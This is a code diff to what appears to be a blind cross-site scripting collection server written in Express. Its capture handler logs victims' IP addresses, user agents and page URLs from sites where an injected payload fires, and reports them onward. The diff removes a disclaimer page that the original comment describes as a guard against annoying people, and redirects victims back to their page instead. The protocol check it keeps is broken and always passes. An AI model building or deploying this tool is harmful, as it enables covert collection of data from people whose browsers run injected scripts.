@@ -32,11 +32,6 @@ exports.displayDefault = (req, res) => {
   res.send('alert(1)');
 };
 
-exports.displayDisclaimer = (req, res) => {
-  res.type('text/html');
-  res.send('uh-oh.');
-};
-
 exports.generatePayloads = (req, res) => {
   res.set('Content-Type', 'text/plain');
   res.send(payloads.generatePayloads(config));
@@ -44,7 +39,13 @@ exports.generatePayloads = (req, res) => {
 
 exports.capture = (req, res) => {
   let domain = {};
-
+  const guid = uuid();
+  if (req.body._) {
+    domain = Domain.fromPayload(req.body._, config);
+  } else {
+    domain = new Domain(config);
+    domain.url = req.get('referer') || null;
+  }
   domain.victimIP =
     req.headers['x-forwarded-for'] ||
     req.connection.remoteAddress ||
@@ -53,24 +54,11 @@ exports.capture = (req, res) => {
     null;
   domain.userAgent = req.headers['user-agent'] || null;
 
-  const guid = uuid();
-  if (req.body._) {
-    domain = Domain.fromPayload(req.body._, config);
-  } else {
-    domain = new Domain(config);
-    domain.url = req.get('referer') || null;
-  }
-
   if (domain.url !== null) {
     const validDomain = new URL.URL({ toString: () => domain.url });
     if (validDomain.protocol === 'https:' || 'http:' || 'file:') {
       reportToUtilities(guid, domain, config);
     }
   }
-  // document.location recurisve loop would annoy a lot of people, redirects to a disclaimer if there is no req.body._
-  if (req.body._) {
-    res.redirect(domain.url);
-  } else {
-    res.redirect('/disclaimer');
-  }
+  res.redirect(`${domain.url}#x1`);
 };
